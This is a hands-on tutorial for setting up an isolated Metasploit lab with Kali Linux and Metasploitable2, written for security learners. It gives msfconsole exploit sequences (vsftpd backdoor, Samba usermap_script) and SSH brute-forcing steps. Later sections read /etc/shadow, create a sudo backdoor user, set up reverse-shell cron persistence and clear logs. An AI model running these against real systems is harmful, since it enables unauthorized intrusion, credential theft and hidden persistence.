# Metasploit Lab Setup Guide

A complete, hands-on guide to building a safe penetration testing lab using Metasploit, Kali Linux, and vulnerable virtual machines.

## Table of Contents

1. [Lab Architecture](#lab-architecture)
2. [Prerequisites & Hardware](#prerequisites--hardware)
3. [Software & Tools](#software--tools)
4. [Step-by-Step Setup](#step-by-step-setup)
5. [Network Configuration](#network-configuration)
6. [Kali Linux Installation](#kali-linux-installation)
7. [Vulnerable Targets](#vulnerable-targets)
8. [First Exploitation](#first-exploitation)
9. [Common Metasploit Workflows](#common-metasploit-workflows)
10. [Post-Exploitation](#post-exploitation)
11. [Lab Cleanup](#lab-cleanup)
12. [Beginner Exercises](#beginner-exercises)
13. [Safety & Legal](#safety--legal)

---

## Lab Architecture

```
┌─────────────────────────────────────────┐
│         Host Machine (Your PC)          │
│  ┌─────────────────────────────────┐   │
│  │   VirtualBox / Hyper-V / KVM    │   │
│  │  ┌────────────┐  ┌────────────┐ │   │
│  │  │  Attacker  │  │   Target   │ │   │
│  │  │ (Kali VM)  │  │ (Vulnerable)│ │   │
│  │  │            │  │             │ │   │
│  │  │ Host-only  │  │ Host-only   │ │   │
│  │  │ Network    │  │ Network     │ │   │
│  │  └────────────┘  └────────────┘ │   │
│  └─────────────────────────────────┘   │
└─────────────────────────────────────────┘

Isolated Network: 192.168.56.0/24 (Host-only, no internet access)
```

**Why this architecture?**
- Both VMs on host-only adapter = completely isolated from your real network
- No risk of accidentally scanning real systems
- Lab cannot reach the internet
- Safe for aggressive scanning and exploitation

---

## Prerequisites & Hardware

**Minimum Requirements:**
- CPU: 4+ cores
- RAM: 8 GB (16 GB recommended)
- Disk: 100 GB free SSD space
- Virtualization: VirtualBox, Hyper-V, or KVM enabled in BIOS

**Recommended Setup:**
- CPU: 6+ cores
- RAM: 16 GB
- Disk: 200+ GB SSD
- SSD for better performance

---

## Software & Tools

You'll need to download:

1. **VirtualBox** (free, cross-platform)
   - https://www.virtualbox.org/
   - Download latest version

2. **Kali Linux** (attacker VM)
   - https://www.kali.org/get-kali/
   - Download VirtualBox pre-built image or ISO

3. **Metasploitable2** (beginner vulnerable target)
   - https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
   - Or: https://information.rapid7.com/metasploitable-linux-vmware-image.html

4. **DVWA** (OWASP Damn Vulnerable Web App) — optional
   - https://github.com/digininja/DVWA
   - For web app testing

5. **Windows 7/10 VM** — optional but useful
   - For Windows-specific exploits

---

## Step-by-Step Setup

### 1. Install VirtualBox

**On Windows/Mac:**
- Download from https://www.virtualbox.org/
- Run installer
- Accept defaults
- Restart computer

**On Linux (Ubuntu/Debian):**
```bash
sudo apt-get update
sudo apt-get install virtualbox virtualbox-ext-pack
```

### 2. Create Host-Only Network

**VirtualBox GUI:**
1. Open VirtualBox
2. Go to **File** → **Tools** → **Network Manager**
3. Click **Create** (or check if vboxnet0 exists)
4. Set IP to `192.168.56.1` (or keep default)
5. DHCP server: **Enable**
   - Server Address: `192.168.56.100`
   - Server Mask: `255.255.255.0`
   - Lower Bound: `192.168.56.101`
   - Upper Bound: `192.168.56.254`

### 3. Create Kali VM

**Option A: Use Kali VirtualBox Pre-Built Image (Easiest)**
1. Download Kali VirtualBox OVA from https://www.kali.org/get-kali/
2. Open VirtualBox → **File** → **Import Appliance**
3. Select the OVA file
4. Click **Import**
5. Start the VM
6. Default login: `kali` / `kali`

**Option B: Manual ISO Installation**
1. Download Kali Linux ISO
2. Create new VM in VirtualBox
   - Type: Linux
   - Version: Debian (64-bit)
   - Memory: 2048 MB (min), 4096 MB (better)
   - Disk: 20 GB
3. Attach ISO to CD drive
4. Boot and install
5. Follow on-screen installer

### 4. Configure Kali Network

1. Start Kali VM
2. Go to **Devices** → **Network Settings**
3. Adapter 1:
   - Attached to: **Host-only Adapter**
   - Name: **vboxnet0** (or your host-only network)
4. Click OK
5. Reboot Kali

**Inside Kali, verify network:**
```bash
ip addr show
# Should show IP in 192.168.56.0/24 range
ping 192.168.56.1  # Should work
ping 8.8.8.8       # Should NOT work (isolated)
```

### 5. Create Metasploitable2 VM

1. Download Metasploitable2 (Linux_Metasploitable.zip)
2. Extract the .vmdk file
3. In VirtualBox: **File** → **Import Appliance**
4. Select the Metasploitable2 files
5. Import
6. Start the VM
7. Default login: `msfadmin` / `msfadmin`

### 6. Configure Metasploitable2 Network

1. Go to **Devices** → **Network Settings**
2. Adapter 1:
   - Attached to: **Host-only Adapter**
   - Name: **vboxnet0**
3. Click OK
4. Reboot

**Inside Metasploitable2, verify:**
```bash
ip addr show
# Should see IP in 192.168.56.0/24 range (e.g., 192.168.56.102)
ping 192.168.56.1  # Should work
```

---

## Network Configuration

**After Setup, Your Lab Network:**

```
Kali (Attacker):        192.168.56.101 (or assigned by DHCP)
Metasploitable2:        192.168.56.102
Host Machine:           192.168.56.1
Network Mask:           255.255.255.0
Gateway:                None (isolated)
DNS:                    Kali can't reach internet
```

**Test connectivity from Kali:**
```bash
ping 192.168.56.102
# Should get replies
```

---

## Kali Linux Installation

### Initial Setup (First Boot)

```bash
# Update system
sudo apt-get update
sudo apt-get upgrade -y

# Install Metasploit (if not pre-installed)
sudo apt-get install metasploit-framework -y

# Verify Metasploit
msfconsole --version
```

### Install Additional Tools (Optional)

```bash
# Nmap for scanning
sudo apt-get install nmap -y

# Burp Suite Community
sudo apt-get install burpsuite -y

# SQLMap for SQL injection
sudo apt-get install sqlmap -y

# Hydra for brute force
sudo apt-get install hydra -y

# John the Ripper for password cracking
sudo apt-get install john -y
```

### Start Metasploit Database

```bash
# Initialize PostgreSQL (required for Metasploit)
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Initialize msfdb
sudo msfdb init

# Start msfconsole
msfconsole
```

**First run may take 1-2 minutes as it initializes the database.**

---

## Vulnerable Targets

### Metasploitable2 (Recommended for Beginners)

**What's vulnerable?**
- FTP (vsftpd 2.3.4 backdoor)
- SSH (brute-forceable)
- Samba (SMB vulnerabilities)
- MySQL (default credentials)
- VNC (weak password)
- Apache Tomcat (default creds)
- Multiple web app vulnerabilities

**Services running on port:**
- 21: FTP
- 22: SSH
- 23: Telnet
- 25: SMTP
- 53: DNS
- 80: HTTP
- 111: rpcbind
- 139/445: SMB (Samba)
- 3306: MySQL
- 5900: VNC
- 8009: Apache JServ
- 8180: Apache Tomcat (HTTP)

### DVWA (Damn Vulnerable Web App)

If you want to test web vulnerabilities:

```bash
# Install DVWA on Kali or separate VM
git clone https://github.com/digininja/DVWA.git
cd DVWA
# Follow setup instructions in README
```

---

## First Exploitation

### Lab Exercise 1: Port Scan

**Goal:** Identify services running on Metasploitable2

**From Kali VM:**

```bash
# Simple TCP scan
nmap 192.168.56.102

# Aggressive scan with version detection
nmap -sV -A 192.168.56.102

# Save results
nmap -sV 192.168.56.102 -oN nmap_results.txt
```

**Expected output:**
```
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 2.3.4
22/tcp    open  ssh        OpenSSH 4.7p1 (protocol 2.0)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
53/tcp    open  domain     ISC BIND 9.4.2
80/tcp    open  http       Apache httpd 2.2.8
111/tcp   open  rpcbind    2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
3306/tcp  open  mysql      MySQL 5.0.51a-3ubuntu5
5900/tcp  open  vnc        VNC (protocol 3.3)
8009/tcp  open  ajp13      Apache Jserv (Protocol v1.3)
8180/tcp  open  http       Apache Tomcat/5.5.26
```

### Lab Exercise 2: Exploit vsftpd Backdoor

**Goal:** Exploit a known FTP vulnerability

**In Kali, start msfconsole:**

```bash
msfconsole
```

**Inside msfconsole:**

```
msf > search vsftpd
# Shows matching exploits

msf > use exploit/unix/ftp/vsftpd_234_backdoor
# Load the exploit module

msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
# Display configurable options

msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
# Set remote target

msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.56.101
# Set local host (Kali's IP)

msf exploit(unix/ftp/vsftpd_234_backdoor) > set LPORT 4444
# Set local port for callback

msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
# Run the exploit

# If successful, you'll get a command shell
```

---

## Common Metasploit Workflows

### Workflow 1: SMB Exploitation (Samba)

```bash
msfconsole

msf > search samba
msf > use exploit/linux/samba/usermap_script
msf exploit(linux/samba/usermap_script) > set RHOSTS 192.168.56.102
msf exploit(linux/samba/usermap_script) > set LHOST 192.168.56.101
msf exploit(linux/samba/usermap_script) > exploit
```

### Workflow 2: SSH Brute Force

```bash
msfconsole

msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.56.102
msf auxiliary(scanner/ssh/ssh_login) > set USERNAME msfadmin
msf auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf auxiliary(scanner/ssh/ssh_login) > run
```

### Workflow 3: MySQL Enumeration

```bash
msfconsole

msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.56.102
msf auxiliary(scanner/mysql/mysql_login) > set USERNAME root
msf auxiliary(scanner/mysql/mysql_login) > run
```

### Workflow 4: Web App Scanner

```bash
msfconsole

msf > use auxiliary/scanner/http/dir_scanner
msf auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.56.102
msf auxiliary(scanner/http/dir_scanner) > set RPORT 80
msf auxiliary(scanner/http/dir_scanner) > run
```

---

## Post-Exploitation

Once you have a shell or session, you can:

### Enumerate system info
```bash
uname -a
whoami
id
pwd
```

### Dump password hashes
```bash
cat /etc/passwd
cat /etc/shadow  # (if root)
```

### Escalate privileges
```
# In meterpreter session:
meterpreter > getsystem
meterpreter > getuid

# Or use modules:
msf > use post/linux/gather/hashdump
```

### Establish persistence
```bash
# Create backdoor user
useradd -m -p $(openssl passwd -1 backdoor) backdoor
usermod -aG sudo backdoor

# Or modify cron for reverse shell callback
```

### Lateral movement
```bash
# Scan internal network
nmap -sn 192.168.56.0/24

# Exploit adjacent systems
```

---

## Lab Cleanup

### Shutdown VMs Safely

```bash
# Inside each VM:
sudo shutdown -h now

# Or from VirtualBox GUI: Machine → ACPI Shutdown
```

### Snapshot Before Testing

**Recommended workflow:**
1. Take a clean snapshot of Metasploitable2 before first exploitation
2. Test exploits
3. Revert to snapshot when done
4. Repeat

```bash
# VirtualBox GUI: Machine → Take Snapshot
# Or restore: Machine → Snapshots → Restore
```

### Delete Lab Completely

```bash
# VirtualBox GUI: Right-click VM → Remove
# Or terminal: VBoxManage unregistervm <VM_UUID> --delete
```

---

## Beginner Exercises

### Exercise 1: Full Recon Workflow
1. Port scan Metasploitable2
2. Identify all open services
3. Research each service for known CVEs
4. Match CVEs with Metasploit modules
5. Document findings

**Time:** 30-45 minutes

### Exercise 2: Multiple Exploitation Paths
1. Exploit via FTP (vsftpd backdoor)
2. Exploit via Samba (usermap_script)
3. Exploit via SSH brute force
4. Document which was fastest/easiest

**Time:** 45-60 minutes

### Exercise 3: Post-Exploitation
1. Gain shell/meterpreter session
2. Enumerate users, groups, permissions
3. Find sensitive files
4. Dump password hashes
5. Attempt privilege escalation

**Time:** 60 minutes

### Exercise 4: Persistence
1. After compromising Metasploitable2
2. Create a backdoor user account
3. Add cron job for reverse shell
4. Reboot target
5. Verify you can re-access system

**Time:** 45 minutes

### Exercise 5: Cover Your Tracks
1. After exploitation
2. Clear bash history
3. Remove log entries
4. Delete temporary files
5. Document detection evasion techniques

**Time:** 30 minutes

---

## Safety & Legal

### ⚠️ CRITICAL SAFETY RULES

1. **Only test systems you own or have written authorization to test**
   - Unauthorized testing is a felony in most jurisdictions
   - Get written permission before testing anything not yours

2. **Keep lab completely isolated**
   - Use host-only networking
   - Verify lab cannot reach internet
   - Never connect to real networks

3. **Never use these techniques on:**
   - Public networks
   - Systems you don't own
   - Systems without explicit authorization
   - Production environments

4. **Document everything**
   - Keep notes on what you tested
   - Record findings
   - Use lab for learning only

5. **Respect responsible disclosure**
   - If you find a real vulnerability in software, report it responsibly
   - Give vendors time to patch before public disclosure

### Legal Framework

- **CFAA (US):** Computer Fraud and Abuse Act — unauthorized access is illegal
- **GDPR (EU):** Data protection regulations apply
- **CCPA (California):** Privacy laws apply
- **Local laws:** Check your jurisdiction

**When in doubt, get written authorization first.**

---

## Next Steps

1. **Set up lab** following steps 1-6 above
2. **Run Exercise 1** (reconnaissance)
3. **Run Exercise 2** (exploitation)
4. **Run Exercise 3** (post-exploitation)
5. **Advanced:** Add more VMs, Windows targets, web apps
6. **Study:** Read Metasploit docs, exploit code, security research

### Useful Resources

- [Metasploit Framework Official Docs](https://docs.rapid7.com/metasploit/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [HackTheBox](https://www.hackthebox.com/) — legal CTF platform
- [TryHackMe](https://tryhackme.com/) — guided hacking labs
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — web app security

---

## Troubleshooting

### Issue: VMs can't ping each other

**Solution:**
1. Verify both VMs use same host-only adapter (vboxnet0)
2. Check VirtualBox Network Manager settings
3. Reboot both VMs
4. Run `ip addr show` inside each VM to confirm IPs

### Issue: Metasploit slow to start

**Solution:**
```bash
sudo systemctl restart postgresql
sudo msfdb reinit
msfconsole
```

### Issue: Exploit doesn't work

**Common causes:**
- Wrong target IP/port
- Service not running on target
- Module requires specific payload
- Firewall blocking (unlikely in lab)
- Try: `show options`, verify all settings, check nmap results

### Issue: No internet in Kali

**Expected behavior** in isolated lab. If you need internet:
- Add second adapter (NAT)
- Configure routing carefully
- Consider separate internet-connected VM for research

---

## Final Notes

This lab is your sandbox for learning penetration testing safely. Use it to:
- Understand how exploits work
- Practice Metasploit commands
- Build muscle memory
- Develop attack methodology

**Always remember:** The skills you learn here are powerful. Use them responsibly and legally.

Happy hacking! 🔐
